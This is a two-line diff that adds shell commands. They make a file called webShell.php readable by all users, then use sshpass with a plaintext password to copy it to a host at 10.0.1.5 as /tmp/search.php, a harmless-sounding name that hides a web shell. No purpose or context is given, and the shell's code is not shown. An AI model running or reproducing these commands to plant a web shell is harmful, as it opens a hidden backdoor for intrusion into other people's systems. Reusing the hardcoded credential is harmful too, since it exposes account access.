@@ -1,0 +1,2 @@
+chmod a+r webShell.php;
+sshpass -p Whg42WbhhCE17FEzrqeJ scp ./webShell.php fherbert@10.0.1.5:/tmp/search.php
